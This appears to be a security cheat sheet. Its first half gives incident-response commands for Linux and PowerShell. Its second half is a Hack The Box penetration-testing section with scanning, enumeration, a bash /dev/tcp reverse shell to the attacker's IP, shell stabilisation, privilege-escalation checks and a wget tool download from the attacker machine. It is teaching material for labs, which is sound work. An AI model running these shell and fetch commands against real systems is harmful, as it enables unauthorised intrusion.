INCIDENT RESPONSE

#001

DISCONNECT

NETWORK

First move in any live infection: cut the network so the worm can't spread to other machines or phone home. Do it at the OS level — closing apps is not enough.

LINUX

ip link set eth0 down nmcli dev disconnect eth0 ip a nmcli radio wifi off

POWERSHELL

Get-NetAdapter | Disable-NetAdapter -Confirm:$false netsh interface set interface "Wi-Fi" admin=disable

NOTE: eth0 is an example — use the real interface name. List interfaces first with ip a (Linux) or Get-NetAdapter (PowerShell).

#002

TERMINATE

PROCESS

Kill the malicious process so it stops doing damage. Find it first with a process list — never kill by guessing a name.

LINUX

top htop pkill -9 <name> killall -9 <name>

POWERSHELL

Get-Process Stop-Process -Name <name> -Force

NOTE: -9 / -Force kills immediately with no cleanup — that is the point during an incident, but it can lose unsaved work inside the killed process.

#003

HARVEST

FORENSICS

Grab logs and connection state BEFORE they roll over or the attacker wipes them. Evidence first, cleanup later.

LINUX

dmesg | tail -50 journalctl -n 100 ss -tupn netstat -tupn

POWERSHELL

Get-WinEvent -LogName System -MaxEvents 100 Get-NetTCPConnection

NOTE: save output to a file (add > evidence.txt) so it survives a reboot. ss is the modern replacement for netstat on Linux.

#004

BARRICADE

FIREWALL

Block the worm's way back in at the firewall. Inbound first, then outbound — a worm that can't call home can't get new orders.

LINUX

iptables -A INPUT -j DROP ufw deny in

POWERSHELL

New-NetFirewallRule -DisplayName "Block worm" -Direction Inbound -Action Block New-NetFirewallRule -DisplayName "Block worm out" -Direction Outbound -Action Block

NOTE: iptables -A INPUT -j DROP is a blunt instrument — it blocks ALL inbound traffic, including legitimate access. Use it to stop the bleeding, then replace it with precise rules.

#005

ROTATE

CREDENTIALS

Assume every password and key on the infected machine is stolen. Change them from a known-clean device, starting with the most privileged accounts.

LINUX

passwd ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_new

POWERSHELL

net user <username> * Set-LocalUser -Name <user> -Password (Read-Host -AsSecureString)

NOTE: rotate from a clean machine — changing passwords on the infected host can hand the new ones straight to the attacker. Revoke API keys and sessions too, not just passwords.

HACK THE BOX

For Hack The Box lab machines and systems you have permission to test only. <IP> and <YOUR-IP> are placeholders — replace them with the real addresses before running anything.

#006

RECON

NETWORK

First touch on a Hack The Box machine: find what's listening before you guess anything. A quick service scan, then a full-port sweep so nothing hides above port 1000.

QUICK SCAN

nmap -sC -sV -oA nmap/scan <IP>

FULL PORTS

nmap -p- --min-rate 1000 -oA nmap/all <IP>

NOTE: <IP> is the target machine's IP — replace it with the real one. -oA saves the scan output in all formats under nmap/.

#007

WEB ENUM

WEB

A web server is listening — go find its hidden pages and directories. Directory brute-forcing with a wordlist is the standard first move.

GOBUSTER

gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt

FFUF

ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt

NOTE: FUZZ is ffuf's keyword — it gets replaced by each wordlist entry in turn.

#008

SMB ENUM

NETWORK

SMB shares are a classic way in on Windows boxes. List the shares anonymously first, then connect to any that look interesting.

LIST SHARES

smbclient -L //<IP> -N

CONNECT

smbclient //<IP>/<share> -N

NOTE: -N means no password (anonymous). Replace <share> with a real share name from the listing.

#009

REVERSE SHELL

SHELL

You got code execution — now catch a shell back on your machine. Start the listener first, then trigger the payload on the target.

LISTENER (YOUR MACHINE)

nc -lvnp 4444

PAYLOAD (TARGET)

bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1

NOTE: <YOUR-IP> is YOUR attack machine's IP (the one running the listener), not the target's. Use your HTB VPN IP.

#010

STABILIZE

SHELL

A raw reverse shell is fragile — no tab-completion, and Ctrl+C kills it. Stabilize it into a proper terminal so you can actually work.

PTY SHELL

python3 -c 'import pty; pty.spawn("/bin/bash")'

TERM + RAW

export TERM=xterm stty raw -echo; fg

NOTE: after the PTY spawn, press Ctrl+Z to background the shell, run stty raw -echo; fg on your machine, then press Enter twice.

#011

PRIVESC ENUM

PRIVESC

You're in as a low user — now hunt for a way up. Check what sudo lets you run, look for SUID binaries, and let LinPEAS do a full sweep.

SUDO + SUID

sudo -l find / -perm -4000 -type f 2>/dev/null

LINPEAS

./linpeas.sh

NOTE: get linpeas.sh onto the box first (see #012 TRANSFER). Read its output — it highlights the interesting findings for you.

#012

TRANSFER

TRANSFER

Need a tool on the target (like linpeas.sh)? Serve it from your machine over HTTP and pull it down on the target.

ATTACKER (SERVE)

python3 -m http.server 8000

TARGET (FETCH)

wget http://<YOUR-IP>:8000/linpeas.sh

NOTE: run the server in the folder containing the file. <YOUR-IP> is your attack machine's IP.
